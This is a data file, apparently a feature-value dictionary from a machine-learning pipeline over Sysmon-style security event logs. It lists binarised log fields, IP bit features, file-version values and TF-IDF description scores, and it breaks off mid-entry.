'binary_ThreadID_14': ['0', 'nan', '1'], 'binary_ThreadID_15': ['0', 'nan', '1'], 'binary_LogonId_0': ['0', 'nan', '1'], 'binary_LogonId_1': ['0', 'nan', '1'], 'binary_LogonId_2': ['0', 'nan', '1'], 'binary_LogonId_3': ['0', 'nan', '1'], 'binary_LogonId_4': ['0', 'nan', '1'], 'binary_LogonId_5': ['0', 'nan', '1'], 'binary_LogonId_6': ['0', 'nan', '1'], 'binary_LogonId_7': ['0', 'nan', '1'], 'binary_LogonId_8': ['0', 'nan', '1'], 'binary_LogonId_9': ['0', 'nan', '1'], 'binary_LogonId_10': ['0', 'nan', '1'], 'binary_LogonId_11': ['0', 'nan', '1'], 'binary_LogonId_12': ['0', 'nan', '1'], 'binary_LogonId_13': ['0', 'nan', '1'], 'binary_LogonId_14': ['0', 'nan', '1'], 'binary_LogonId_15': ['0', 'nan', '1'], 'binary_SourceHostname_0': ['0', 'nan', '1'], 'binary_SourceHostname_1': ['0', 'nan', '1'], 'binary_SourceHostname_2': ['0', 'nan', '1'], 'binary_SourceHostname_3': ['0', 'nan', '1'], 'binary_SourceHostname_4': ['0', 'nan', '1'], 'binary_SourceHostname_5': ['0', 'nan', '1'], 'binary_SourceHostname_6': ['0', 'nan', '1'], 'binary_SourceHostname_7': ['0', 'nan', '1'], 'binary_SourceHostname_8': ['0', 'nan', '1'], 'binary_SourceHostname_9': ['0', 'nan', '1'], 'binary_SourceHostname_10': ['0', 'nan', '1'], 'binary_SourceHostname_11': ['0', 'nan', '1'], 'binary_SourceHostname_12': ['0', 'nan', '1'], 'binary_SourceHostname_13': ['0', 'nan', '1'], 'binary_SourceHostname_14': ['0', 'nan', '1'], 'binary_SourceHostname_15': ['0', 'nan', '1'], 'binary_OriginalFileName_0': ['0', 'nan', '1'], 'binary_OriginalFileName_1': ['0', 'nan', '1'], 'binary_OriginalFileName_2': ['0', 'nan', '1'], 'binary_OriginalFileName_3': ['0', 'nan', '1'], 'binary_OriginalFileName_4': ['0', 'nan', '1'], 'binary_OriginalFileName_5': ['0', 'nan', '1'], 'binary_OriginalFileName_6': ['0', 'nan', '1'], 'binary_OriginalFileName_7': ['0', 'nan', '1'], 'binary_OriginalFileName_8': ['0', 'nan', '1'], 'binary_OriginalFileName_9': ['0', 'nan', '1'], 'binary_OriginalFileName_10': ['0', 'nan', '1'], 'binary_OriginalFileName_11': ['0', 'nan', '1'], 'binary_OriginalFileName_12': ['0', 'nan', '1'], 'binary_OriginalFileName_13': ['0', 'nan', '1'], 'binary_OriginalFileName_14': ['0', 'nan', '1'], 'binary_OriginalFileName_15': ['0', 'nan', '1'], 'binary_TargetProcessGuid_0': ['0', 'nan', '1'], 'binary_TargetProcessGuid_1': ['0', 'nan', '1'], 'binary_TargetProcessGuid_2': ['0', 'nan', '1'], 'binary_TargetProcessGuid_3': ['0', 'nan', '1'], 'binary_TargetProcessGuid_4': ['0', 'nan', '1'], 'binary_TargetProcessGuid_5': ['0', 'nan', '1'], 'binary_TargetProcessGuid_6': ['0', 'nan', '1'], 'binary_TargetProcessGuid_7': ['0', 'nan', '1'], 'binary_TargetProcessGuid_8': ['0', 'nan', '1'], 'binary_TargetProcessGuid_9': ['0', 'nan', '1'], 'binary_TargetProcessGuid_10': ['0', 'nan', '1'], 'binary_TargetProcessGuid_11': ['0', 'nan', '1'], 'binary_TargetProcessGuid_12': ['0', 'nan', '1'], 'binary_TargetProcessGuid_13': ['0', 'nan', '1'], 'binary_TargetProcessGuid_14': ['0', 'nan', '1'], 'binary_TargetProcessGuid_15': ['0', 'nan', '1'], 'binary_DestinationHostname_0': ['0', 'nan', '1'], 'binary_DestinationHostname_1': ['0', 'nan', '1'], 'binary_DestinationHostname_2': ['0', 'nan', '1'], 'binary_DestinationHostname_3': ['0', 'nan', '1'], 'binary_DestinationHostname_4': ['0', 'nan', '1'], 'binary_DestinationHostname_5': ['0', 'nan', '1'], 'binary_DestinationHostname_6': ['0', 'nan', '1'], 'binary_DestinationHostname_7': ['0', 'nan', '1'], 'binary_DestinationHostname_8': ['0', 'nan', '1'], 'binary_DestinationHostname_9': ['0', 'nan', '1'], 'binary_DestinationHostname_10': ['0', 'nan', '1'], 'binary_DestinationHostname_11': ['0', 'nan', '1'], 'binary_DestinationHostname_12': ['0', 'nan', '1'], 'binary_DestinationHostname_13': ['0', 'nan', '1'], 'binary_DestinationHostname_14': ['0', 'nan', '1'], 'binary_DestinationHostname_15': ['0', 'nan', '1'], 'binary_SourcePortName_0': ['0', 'nan', '1'], 'binary_SourcePortName_1': ['0', 'nan', '1'], 'binary_SourcePortName_2': ['0', 'nan', '1'], 'binary_SourcePortName_3': ['0', 'nan', '1'], 'binary_SourcePortName_4': ['0', 'nan', '1'], 'binary_SourcePortName_5': ['0', 'nan', '1'], 'binary_SourcePortName_6': ['0', 'nan', '1'], 'binary_SourcePortName_7': ['0', 'nan', '1'], 'binary_SourcePortName_8': ['0', 'nan', '1'], 'binary_SourcePortName_9': ['0', 'nan', '1'], 'binary_SourcePortName_10': ['0', 'nan', '1'], 'binary_SourcePortName_11': ['0', 'nan', '1'], 'binary_SourcePortName_12': ['0', 'nan', '1'], 'binary_SourcePortName_13': ['0', 'nan', '1'], 'binary_SourcePortName_14': ['0', 'nan', '1'], 'binary_SourcePortName_15': ['0', 'nan', '1'], 'binary_DestinationPortName_0': ['0', 'nan', '1'], 'binary_DestinationPortName_1': ['0', 'nan', '1'], 'binary_DestinationPortName_2': ['0', 'nan', '1'], 'binary_DestinationPortName_3': ['0', 'nan', '1'], 'binary_DestinationPortName_4': ['0', 'nan', '1'], 'binary_DestinationPortName_5': ['0', 'nan', '1'], 'binary_DestinationPortName_6': ['0', 'nan', '1'], 'binary_DestinationPortName_7': ['0', 'nan', '1'], 'binary_DestinationPortName_8': ['0', 'nan', '1'], 'binary_DestinationPortName_9': ['0', 'nan', '1'], 'binary_DestinationPortName_10': ['0', 'nan', '1'], 'binary_DestinationPortName_11': ['0', 'nan', '1'], 'binary_DestinationPortName_12': ['0', 'nan', '1'], 'binary_DestinationPortName_13': ['0', 'nan', '1'], 'binary_DestinationPortName_14': ['0', 'nan', '1'], 'binary_DestinationPortName_15': ['0', 'nan', '1'], 'binary_StartAddress_0': ['0', 'nan', '1'], 'binary_StartAddress_1': ['0', 'nan', '1'], 'binary_StartAddress_2': ['0', 'nan', '1'], 'binary_StartAddress_3': ['0', 'nan', '1'], 'binary_StartAddress_4': ['0', 'nan', '1'], 'binary_StartAddress_5': ['0', 'nan', '1'], 'binary_StartAddress_6': ['0', 'nan', '1'], 'binary_StartAddress_7': ['0', 'nan', '1'], 'binary_StartAddress_8': ['0', 'nan', '1'], 'binary_StartAddress_9': ['0', 'nan', '1'], 'binary_StartAddress_10': ['0', 'nan', '1'], 'binary_StartAddress_11': ['0', 'nan', '1'], 'binary_StartAddress_12': ['0', 'nan', '1'], 'binary_StartAddress_13': ['0', 'nan', '1'], 'binary_StartAddress_14': ['0', 'nan', '1'], 'binary_StartAddress_15': ['0', 'nan', '1'], 'binary_StartModule_0': ['0', 'nan', '1'], 'binary_StartModule_1': ['0', 'nan', '1'], 'binary_StartModule_2': ['0', 'nan', '1'], 'binary_StartModule_3': ['0', 'nan', '1'], 'binary_StartModule_4': ['0', 'nan', '1'], 'binary_StartModule_5': ['0', 'nan', '1'], 'binary_StartModule_6': ['0', 'nan', '1'], 'binary_StartModule_7': ['0', 'nan', '1'], 'binary_StartModule_8': ['0', 'nan', '1'], 'binary_StartModule_9': ['0', 'nan', '1'], 'binary_StartModule_10': ['0', 'nan', '1'], 'binary_StartModule_11': ['0', 'nan', '1'], 'binary_StartModule_12': ['0', 'nan', '1'], 'binary_StartModule_13': ['0', 'nan', '1'], 'binary_StartModule_14': ['nan', '1'], 'binary_StartModule_15': ['0', 'nan', '1'], 'binary_NewThreadId_0': ['0', 'nan', '1'], 'binary_NewThreadId_1': ['0', 'nan', '1'], 'binary_NewThreadId_2': ['0', 'nan', '1'], 'binary_NewThreadId_3': ['0', 'nan', '1'], 'binary_NewThreadId_4': ['0', 'nan', '1'], 'binary_NewThreadId_5': ['0', 'nan', '1'], 'binary_NewThreadId_6': ['0', 'nan', '1'], 'binary_NewThreadId_7': ['0', 'nan', '1'], 'binary_NewThreadId_8': ['0', 'nan', '1'], 'binary_NewThreadId_9': ['0', 'nan', '1'], 'binary_NewThreadId_10': ['0', 'nan', '1'], 'binary_NewThreadId_11': ['0', 'nan', '1'], 'binary_NewThreadId_12': ['0', 'nan', '1'], 'binary_NewThreadId_13': ['0', 'nan', '1'], 'binary_NewThreadId_14': ['0', 'nan', '1'], 'binary_NewThreadId_15': ['0', 'nan', '1'], 'binary_GrantedAccess_0': ['nan', '0', '1'], 'binary_GrantedAccess_1': ['nan', '0', '1'], 'binary_GrantedAccess_2': ['nan', '0', '1'], 'binary_GrantedAccess_3': ['0', 'nan', '1'], 'binary_GrantedAccess_4': ['nan', '0', '1'], 'binary_GrantedAccess_5': ['nan', '0', '1'], 'binary_GrantedAccess_6': ['0', 'nan', '1'], 'binary_GrantedAccess_7': ['nan', '0', '1'], 'binary_GrantedAccess_8': ['0', 'nan', '1'], 'binary_GrantedAccess_9': ['nan', '0', '1'], 'binary_GrantedAccess_10': ['nan', '0', '1'], 'binary_GrantedAccess_11': ['nan', '0', '1'], 'binary_GrantedAccess_12': ['nan', '0', '1'], 'binary_GrantedAccess_13': ['0', 'nan', '1'], 'binary_GrantedAccess_14': ['nan', '0', '1'], 'binary_GrantedAccess_15': ['0', 'nan', '1'], 'binary_QueryName_0': ['nan', '0', '1'], 'binary_QueryName_1': ['nan', '0', '1'], 'binary_QueryName_2': ['nan', '0', '1'], 'binary_QueryName_3': ['0', 'nan', '1'], 'binary_QueryName_4': ['nan', '0', '1'], 'binary_QueryName_5': ['nan', '0', '1'], 'binary_QueryName_6': ['0', 'nan', '1'], 'binary_QueryName_7': ['nan', '0', '1'], 'binary_QueryName_8': ['0', 'nan', '1'], 'binary_QueryName_9': ['nan', '0', '1'], 'binary_QueryName_10': ['nan', '0', '1'], 'binary_QueryName_11': ['nan', '0', '1'], 'binary_QueryName_12': ['nan', '0', '1'], 'binary_QueryName_13': ['0', 'nan', '1'], 'binary_QueryName_14': ['nan', '0', '1'], 'binary_QueryName_15': ['0', 'nan', '1'], 'binary_QueryResults_0': ['nan', '0', '1'], 'binary_QueryResults_1': ['nan', '0', '1'], 'binary_QueryResults_2': ['nan', '0', '1'], 'binary_QueryResults_3': ['0', 'nan', '1'], 'binary_QueryResults_4': ['nan', '0', '1'], 'binary_QueryResults_5': ['nan', '0', '1'], 'binary_QueryResults_6': ['0', 'nan', '1'], 'binary_QueryResults_7': ['nan', '0', '1'], 'binary_QueryResults_8': ['0', 'nan', '1'], 'binary_QueryResults_9': ['nan', '0', '1'], 'binary_QueryResults_10': ['nan', '0', '1'], 'binary_QueryResults_11': ['nan', '0', '1'], 'binary_QueryResults_12': ['nan', '0', '1'], 'binary_QueryResults_13': ['0', 'nan', '1'], 'binary_QueryResults_14': ['nan', '0', '1'], 'binary_QueryResults_15': ['0', 'nan', '1'], 'binary_Hashes_0': ['0', 'nan', '1'], 'binary_Hashes_1': ['0', 'nan', '1'], 'binary_Hashes_2': ['0', 'nan', '1'], 'binary_Hashes_3': ['0', 'nan', '1'], 'binary_Hashes_4': ['0', 'nan', '1'], 'binary_Hashes_5': ['0', 'nan', '1'], 'binary_Hashes_6': ['0', 'nan', '1'], 'binary_Hashes_7': ['0', 'nan', '1'], 'binary_Hashes_8': ['0', 'nan', '1'], 'binary_Hashes_9': ['0', 'nan', '1'], 'binary_Hashes_10': ['0', 'nan', '1'], 'binary_Hashes_11': ['0', 'nan', '1'], 'binary_Hashes_12': ['0', 'nan', '1'], 'binary_Hashes_13': ['0', 'nan', '1'], 'binary_Hashes_14': ['0', 'nan', '1'], 'binary_Hashes_15': ['0', 'nan', '1'], 'binary_Hash_0': ['0', 'nan', '1'], 'binary_Hash_1': ['0', 'nan', '1'], 'binary_Hash_2': ['0', 'nan', '1'], 'binary_Hash_3': ['0', 'nan', '1'], 'binary_Hash_4': ['0', 'nan', '1'], 'binary_Hash_5': ['0', 'nan', '1'], 'binary_Hash_6': ['0', 'nan', '1'], 'binary_Hash_7': ['0', 'nan', '1'], 'binary_Hash_8': ['0', 'nan', '1'], 'binary_Hash_9': ['0', 'nan', '1'], 'binary_Hash_10': ['0', 'nan', '1'], 'binary_Hash_11': ['0', 'nan', '1'], 'binary_Hash_12': ['0', 'nan', '1'], 'binary_Hash_13': ['0', 'nan', '1'], 'binary_Hash_14': ['0', 'nan', '1'], 'binary_Hash_15': ['0', 'nan', '1'], 'binary_Contents_0': ['0', 'nan', '1'], 'binary_Contents_1': ['0', 'nan', '1'], 'binary_Contents_2': ['0', 'nan', '1'], 'binary_Contents_3': ['0', 'nan', '1'], 'binary_Contents_4': ['0', 'nan', '1'], 'binary_Contents_5': ['0', 'nan', '1'], 'binary_Contents_6': ['0', 'nan', '1'], 'binary_Contents_7': ['0', 'nan', '1'], 'binary_Contents_8': ['0', 'nan', '1'], 'binary_Contents_9': ['0', 'nan', '1'], 'binary_Contents_10': ['0', 'nan', '1'], 'binary_Contents_11': ['0', 'nan', '1'], 'binary_Contents_12': ['0', 'nan', '1'], 'binary_Contents_13': ['0', 'nan', '1'], 'binary_Contents_14': ['0', 'nan', '1'], 'binary_Contents_15': ['0', 'nan', '1'], 'SourceIp_binary_0': ['0', '1'], 'SourceIp_binary_1': ['0', '1'], 'SourceIp_binary_2': ['0', '1'], 'SourceIp_binary_3': ['0', '1'], 'SourceIp_binary_4': ['0', '1'], 'SourceIp_binary_5': ['0', '1'], 'SourceIp_binary_6': ['0', '1'], 'SourceIp_binary_7': ['0', '1'], 'SourceIp_binary_8': ['0', '1'], 'SourceIp_binary_9': ['0', '1'], 'SourceIp_binary_10': ['0', '1'], 'SourceIp_binary_11': ['0', '1'], 'SourceIp_binary_12': ['0', '1'], 'SourceIp_binary_13': ['0', '1'], 'SourceIp_binary_14': ['0', '1'], 'SourceIp_binary_15': ['0', '1'], 'SourceIp_prefix_binary_0': ['0', '1'], 'SourceIp_prefix_binary_1': ['0', '1'], 'SourceIp_prefix_binary_2': ['0', '1'], 'SourceIp_prefix_binary_3': ['0', '1'], 'SourceIp_prefix_binary_4': ['0', '1'], 'SourceIp_prefix_binary_5': ['0', '1'], 'SourceIp_prefix_binary_6': ['0', '1'], 'SourceIp_prefix_binary_7': ['0', '1'], 'SourceIp_prefix_binary_8': ['0', '1'], 'SourceIp_prefix_binary_9': ['0', '1'], 'SourceIp_prefix_binary_10': ['0', '1'], 'SourceIp_prefix_binary_11': ['0', '1'], 'SourceIp_prefix_binary_12': ['0', '1'], 'SourceIp_prefix_binary_13': ['0', '1'], 'SourceIp_prefix_binary_14': ['0', '1'], 'SourceIp_prefix_binary_15': ['0', '1'], 'DestinationIp_binary_0': ['0', '1'], 'DestinationIp_binary_1': ['0', '1'], 'DestinationIp_binary_2': ['0', '1'], 'DestinationIp_binary_3': ['0', '1'], 'DestinationIp_binary_4': ['0', '1'], 'DestinationIp_binary_5': ['0', '1'], 'DestinationIp_binary_6': ['0', '1'], 'DestinationIp_binary_7': ['0', '1'], 'DestinationIp_binary_8': ['0', '1'], 'DestinationIp_binary_9': ['0', '1'], 'DestinationIp_binary_10': ['0', '1'], 'DestinationIp_binary_11': ['0', '1'], 'DestinationIp_binary_12': ['0', '1'], 'DestinationIp_binary_13': ['0', '1'], 'DestinationIp_binary_14': ['0', '1'], 'DestinationIp_binary_15': ['0', '1'], 'DestinationIp_prefix_binary_0': ['0', '1'], 'DestinationIp_prefix_binary_1': ['0', '1'], 'DestinationIp_prefix_binary_2': ['0', '1'], 'DestinationIp_prefix_binary_3': ['0', '1'], 'DestinationIp_prefix_binary_4': ['0', '1'], 'DestinationIp_prefix_binary_5': ['0', '1'], 'DestinationIp_prefix_binary_6': ['0', '1'], 'DestinationIp_prefix_binary_7': ['0', '1'], 'DestinationIp_prefix_binary_8': ['0', '1'], 'DestinationIp_prefix_binary_9': ['0', '1'], 'DestinationIp_prefix_binary_10': ['0', '1'], 'DestinationIp_prefix_binary_11': ['0', '1'], 'DestinationIp_prefix_binary_12': ['0', '1'], 'DestinationIp_prefix_binary_13': ['0', '1'], 'DestinationIp_prefix_binary_14': ['0', '1'], 'DestinationIp_prefix_binary_15': ['0', '1'], 'FileVersion_Part_0_normalized': ['0.025487256371814', '0.0049975012493753', '0.0002251238180999', '0.0039980009995002', '0.0714285714285714', '0.1428571428571428', '0.0069965017491254', '0.0002701485817199', '0.0014992503748125', '0.004817649707339'], 'FileVersion_Part_1_normalized': ['0.0047528517110266', '0.9990955137481908', '0.0112156295224312', '0.0494296577946768', '0.024390243902439', '0.010492040520984', '0.01714001447178', '0.0152091254752851', '0.5625', '0.0633592619392185'], 'FileVersion_Part_2_normalized': ['0.0074793792814203', '0.0389347127079547', '0.0051377044596672', '0.034950370473927', '0.0100657066964909', '0.0026212777855445', '0.0055571089053543', '0.0315252341674821', '0.0444568712428351', '0.0773451698588005'], 'FileVersion_Part_3_normalized': ['0.0003622133824908', '0.2655029296875', '0.0041088284286507', '0.0213253128941496', '0.0002975324213317', '0.0049902831760133', '0.01410044953268', '0.0085378868729989', '0.0147019824714595', '0.20123291015625'], 'Description_tfidf_0': ['nan', '0.5169901227431348', '0.6309428492362296', '0.5096877653958601', '0.487194755912427', '0.0'], 'Description_tfidf_1': ['nan', '0.5629853156778106', '0.2535795730882987', '0.0', '0.6057780318131011'], 'Description_tfidf_2': ['0.5629717405024318', 'nan', '0.253301112237522', '0.5198783713387514', '0.4256663458175272', '0.0'], 'Description_tfidf_3': ['nan', '0.5950683495505401', '0.4525940507609635', '0.7027765170838005', '0.5284898169914296', '0.0'], 'Description_tfidf_4': ['nan', '0.4585060723773579', '0.4427395708543781', '0.6674915868542988', '0.515075549952005', '0.4773364423453646', '0.0', '0.5185325856256374'], 'Description_tfidf_5': ['nan', '0.8127411869179203', '0.521399379033015', '0.6126856115741283', '0.0'], 'Description_tfidf_6': ['nan', '0.6257640715001134', '0.5153276979685751', '0.548990097099721', '0.5108811432553634', '0.4210037043066886', '0.0', '0.6171603338205036'], 'Description_tfidf_7': ['nan', '0.5333125177423647', '0.5328417368714827', '0.4520802017952222', '0.6628876209562093', '0.49047611089514', '0.5384389562801877', '0.5830314343920114', '0.0', '0.3903413069765745'], 'Description_tfidf_8': ['nan', '0.3842091559395605', '0.2956398537455579', '0.3960175987128472', '0.4126810563534582', '0.5521440148915169', '0.6289328856871429', '0.4792872296404745', '0.5517306252123871', '0.5155833496382515'], 'Description_tfidf_9': ['nan', '0.5497924090077502', '0', '0.585107184780177', '0.3752798494116078', '0.491639460678223', '1', '0.6120624957514432', '0.0', '0.4509294478867579'], 'Description_tfidf_10': ['nan', '0', '0.6401459498982549', '0.4884987920362966', '1', '0.0', '0.5677632921878693'], 'Description_tfidf_11': ['nan', '0.4437236514385012', '0', '0.4674589373300332', '0.5255161270817704', '0.6393232121051577', '1', '0.0', '0.4861691828314684', '0.5605809053103845'], 'Description_tfidf_12': ['nan', '0', '0.5456590366026652', '1', '0.5710468462140722', '0.6697159936409462', '0.0'], 'Description_tfidf_13': ['nan', '0.5892191473768976', '0.6604479120943421', '0', '0.5661193974164679', '0.6372732544880758', '1', '0.7471558283891964', '0.0', '0.5195464764607213'], 'Description_tfidf_14': ['nan', '0.5773502691896258', '0.5014231414804187', '0', '0.4694522147096134', '0.5561662167589759', '0.6984468370527279', '1', '0.0', '0.7202693915329765'], 'Description_tfidf_15': ['nan', '0.5712923692404743', '0.823492072100235', '0.4247662011715645', '0.5812066061704612', '0.4631035195201134', '0', '0.5333984248073074', '0.5239558801422358', '0.6947163250247462'], 'Description_tfidf_16': ['0.3853464476060588', 'nan', '0.5165472389076401', '0.4593692822239977', '0', '0.3640635361790006', '0.3752798494116078', '0.2961534152311478', '1', '0.4884721624294524'], 'Description_tfidf_17': ['nan', '0.4245785593254659', '0.3741279389740105', '0.3900714171769143', '0.2333785522678167', '0.2782517304106279', '0.3663535216900201', '0.428388801000449', '0.2679515345941068', '0'], 'Description_tfidf_18': ['nan', '0.7071067811865476', '0.640921012044815', '0', '1', '0.0', '0.7115885211704883'], 'Description_tfidf_19': ['nan', '0.4132325628179641', '0', '0.5051141384850113', '0.6393232121051577', '1', '0.6988721129244404', '0.0'], 'Description_tfidf_20': ['nan', '0', '1.0', '0.5434618925884427', '0.3824463364395223', '1', '0.5554840479285543', '0.5069080401258048', '0.0', '0.4932427637071023'], 'Description_tfidf_21': ['0.3748980118006671', '0.6265199284897868', 'nan', '0.3268778717122076', '0.5748948048258108', '0', '0.6714438741040325', '0.5263313442232653', '0.4792791666332555', '0.3947170194837109'], 'Description_tfidf_22': ['nan', '0', '0.4884987920362966', '0.4813378729927731', '1', '0.7071067811865475', '0.0'], 'Description_tfidf_23': ['nan', '0.3766416296017726', '0', '0.398658622095319', '0.7413016455372313', '0.5737091659125286', '0.6601128659233368', '1', '0.4734848448536292', '0.0'], 'Description_tfidf_24': ['nan', '0', '0.529236687207608', '0.6671131947855915', '1', '0.0', '0.6164769417440593', '0.7766367120294388'], 'Description_tfidf_25': ['nan', '0.4145398777332585', '0', '0.4385405780842603', '0.6936116506890798', '1', '0.0'], 'Description_tfidf_26': ['nan', '0.5169901227431348', '0', '1', '0.0', '0.55569119000457', '0.6333329455891463'], 'Description_tfidf_27': ['nan', '0', '0.52546371066607', '0.748254765600685', '0.3798328870434758', '0.4247574768193027', '0.4385405780842603', '1', '0.5599657183563089', '0.0'], 'Description_tfidf_28': ['nan', '0.6172096026002036', '0.4434025846776733', '0.4819674723169783', '0', '1', '0.0', '0.637629183834905'], 'Description_tfidf_29': ['nan', '0', '0.4800366601532941', '0.4605278220180585', '0.6239373199183876', '1', '0.5910202506202469', '0.0', '0.5990185845595201'], 'Description_tfidf_30': ['0.3748980118006671', 'nan', '0.6672703132638957', '0.5950683495505401', '1', '0.0'], 'Description_tfidf_31': ['nan', '0', '1', '0.5771311381367605', '0.5249976642240116', '0.0', '0.7331816977307669', '0.6804371859562315'], 'Description_tfidf_32': ['nan', '0.683853695534988', '0', '0.5896597328618982', '0.4463571059934882', '0.4817848334537136', '0.0', '0.5697171905577981'], 'Description_tfidf_33': ['nan', '0.518007622807605', '0.734020845334113', '0', '1', '0.0', '0.6297012719126013'], 'Description_tfidf_34': ['nan', '0', '0.543610981521777', '0.6601128659233368', '1', '0.0', '0.542812712028527', '0.3706649876012677'], 'Description_tfidf_35': ['nan', '0.4884232246555598', '0.5694498299458689', '0.7071067811865476', '0', '0.4516087474222652', '0.4834434415179114', '1', '0.0', '0.867581705714783'], 'Description_tfidf_36': ['0.2900825746497509', '0.373501931382683', 'nan', '0.5003308537379221', '0', '0.5831057078309362', '0.5089173846557914', '1', '0.5864479777465605', '0.5933989596640425'], 'Description_tfidf_37': ['nan', '0', '0.4813378729927731', '0.7299253875135759', '0.5333663428941323', '0.0', '0.6642998657045528'], 'Description_tfidf_38': ['nan', '0.2605613160622806', '0', '0.3798328870434758', '0.6843232799469241', '1', '0.703582146639893', '0.0', '0.4030807772714421'], 'Description_tfidf_39': ['0.3818348561475472', '0.4080783347016012', '0.532791190089626', '0.3431165202479523', 'nan', '0.4809330422614796', '0', '0.538323263943507', '1', '0.7141615404240667'], 'Description_tfidf_40': ['nan', '0.7439050464075883', '0', '1', '0.593629507033506', '0.7014399959012456', '0.0'], 'Description_tfidf_41': ['nan', '0.71653143358088', '0', '0.4595475185577499', '1', '0.7071067811865475', '0.0'], 'Description_tfidf_42': ['0.6106443270448328', 'nan', '0.507227512612943', '0.472595150042505', '0', '0.6821676618135762', '1', '0.0'], 'Description_tfidf_43': ['nan', '0.5139626838821042', '0.4646466681050513', '0.6688391170024061', '0.2799629697763788', '0.4366761845670998', '0.369448919523461', '0.44269530066481', '0.4142342736371118', '0.2840829864508293'], 'Description_tfidf_44': ['nan', '0.4819674723169783', '0', '1', '0.4572072399449403', '0.7980467421686849', '0.0', '0.6759324993064144'], 'Description_tfidf_45': ['nan', '0.3392320667244938', '0.6082850056269892', '0.1820926045609875', '0.5865554473593946', '0', '0.4674965796250889', '0.6439264174656747', '0.4506288952159051', '0.7065935183132813'], 'Description_tfidf_46': ['nan', '0.486037668830791', '0.5741642319251277', '0.5949766005381959', '0', '0.5664102619516528', '0.4792872296404745', '0.4254964855170426', '1', '0.3873440124099729'], 'Description_tfidf_47': ['nan', '0.4489975656324425', '0.4644947984155133', '0', '0.8146590038544439', '1', '0.4586071041147215', '0.6321935763574256', '0.5905881342185617', '0.0'], 'Description_tfidf_48': ['nan', '0.6604668030212532', '0.7219040235915849', '0', '0.4759509291613031', '0.5603826657460235', '0.662376112091109', '0.0'], 'Description_tfidf_49': ['nan', '0.1946748925505784', '0.5118221267767021', '0.5062427337730735', '0', '0.4759509291613031', '0.8731135616377588', '0.5356369040456576', '0.703425443927475', '0.5355812565156087'], 'Description_tfidf_50': ['nan', '0', '1', '0.4911251068634023', '0.5272112390652299', '0.0', '0.5240108089882622'], 'Description_tfidf_51': ['nan', '0.5441976040193577', '0', '0.5481619128913525', '1', '0.4157751080009697', '0.0', '0.6695680341276626'], 'Description_tfidf_52': ['nan', '0', '0.4884987920362966', '1', '0.5038354164946025', '0.0', '0.6164769417440593'], 'Description_tfidf_53': ['nan', '0.668745163001914', '0.6492528469043106', '0', '0.5972334955804708', '1', '0.6725593376653183', '0.0', '0.5521049603939315'], 'Description_tfidf_54': ['nan', '0.5629993687768448', '0', '0.6810392786608965', '1', '0.0', '0.7708781884396485'], 'Description_tfidf_55': ['nan', '0.5511654815161414', '0', '0.4689734454822813', '1', '0.8226662654740292', '0.9023776469280178', '0.0', '0.6400527690646546', '0.5337569137826352'], 'Description_tfidf_56': ['nan', '0.6690418936889432', '0.5716053317577002', '0', '1.0', '0.60259555036023', '0.6787425250466279', '0.8339502558744021', '1', '0.0'], 'Description_tfidf_57': ['nan', '0.7084851851833859', '0.6240129776979432', '0.586298357371805', '1', '0.5296471387299279', '0.0', '0.4497143561615609'], 'Description_tfidf_58': ['nan', '0.5093559652282438', '0.5460742257518566', '0.6573519707214066', '0', '1', '0.0', '0.4976413537484114'], 'Description_tfidf_59': ['0.5659624413929195', 'nan', '0.6435898754994692', '0', '0.8831140302626426', '1', '0.0', '0.6458488093493621'], 'Description_tfidf_60': ['nan', '0.646821235107373', '0.6902949986359052', '0.8080098016181241', '0', '0.6376224620939716', '1', '0.0', '0.6547334800797073'], 'Description_tfidf_61': ['nan', '0.4706393363954286', '0', '0.6766277714994662', '0.5055122028181983', '0.0', '0.7174739893594986'], 'Description_tfidf_62': ['nan', '0.7071067811865476', '0', '1', '0.5570902663573792', '0.0', '0.5961007835765133'], 'Description_tfidf_63': ['0.4143733070385075', 'nan', '0.4634328243393127', '0.2049995990204501', '0.2380709713366479', '0.3029104565462137', '0', '0.5039892531436337', '0.1945842679163153', '0.4185496825953544'], 'Description_tfidf_64': ['0.470547661697783', 'nan', '0.7092006666610162', '0', '0.7666135048127231', '1', '0.0'], 'Description_tfidf_65': ['nan', '0.5213918412004918', '0', '0.6965885024620868', '1', '0.5047168256152285', '0.0'], 'Description_tfidf_66': ['nan', '0.5855575856764936', '0.4968193678080845', '0.6800327919392052', '1', '0.5773502691896257', '0.0'], 'Description_tfidf_67': ['nan', '0.69757028244765', '0.592057347778808', '0.6757281988530056', '0.4525940507609635', '1', '0.5284898169914296', '0.0'], 'Description_tfidf_68': ['0.4812335259458739', 'nan', '0', '0.5569917452102434', '0.4603351127352278', '1', '0.0', '0.7084282084501788'], 'Description_tfidf_69': ['0.5930482262108983', 'nan', '0.7789333691050191', '1', '0.0', '0.6701838717838025'], 'Description_tfidf_70': ['nan', '0.588072366672091', '0', '0.6306341780022575', '1', '0.4911251068634023', '0.0'], 'Description_tfidf_71': ['0.4871427449726066', 'nan', '0.3253457269334515', '0.4402664707595354', '0.6118468147438618', '0.4145399414402537', '0.3242785887487373', '0.2255419163371033', '0.2835298350654454', '0.2807479074098713'], 'Description_tfidf_72': ['nan', '0.5630922094932703', '0.4817938506248242', '0', '0.4671113394360779', '0.4930144732621551', '0.6128081295892164', '1', '0.5904211705523521', '0.5839106812901502'], 'Description_tfidf_73': ['nan', '0.4901374895274812', '0.5949766005381959', '0.5136138293399511', '1', '0.4412322846298068', '0.0', '0.6682853297277472', '0.412503816296434'], 'Description_tfidf_74': ['nan', '0.4901374895274812', '0.6933914032923105', '1', '0.0', '0.6171603338205036'], 'Description_tfidf_75': ['nan', '0.4884206568186199', '0.6554957811337759', '0', '0.5638539799962344', '0.0', '0.5409798873343151', '0.533923221119257'], 'Description_tfidf_76': ['nan', '0.6395104883358722', '0', '0.3956412826856548', '0.5203399041228771', '0.746340769687269', '0.5008455467462829', '0.0', '0.551231722108399', '0.4325880010068103'], 'Description_tfidf_77': ['0.7653705456539188', 'nan', '0', '0.646772214840922', '0.593629507033506', '0.0'], 'Description_tfidf_78': ['nan', '0.5331593202655489', '0', '0.4313539102445701', '0.5910202506202469', '0.0'], 'Description_tfidf_79': ['nan', '0.3747963036374578', '0.4239084629207613', '0.2499527247995678', '0.3327810693413051', '0.4964239505283787', '0.4234351212921335', '0.377061525579423', '0.2306512861384304', '0.3205217910302956'], 'Description_tfidf_80': ['nan', '0.7625098633062068', '0', '0.0', '0.7331611650971267', '0.4213343693123426'], 'Description_tfidf_81': ['0.5377059719641689', 'nan', '0', '0.4260731025970247', '0.4340835098137643', '0.0', '0.758560680213075'], 'Description_tfidf_82': ['nan', '0.5071591461765975', '0.6206402622081949', '1', '0.4580782786012253', '0.6540075806418985', 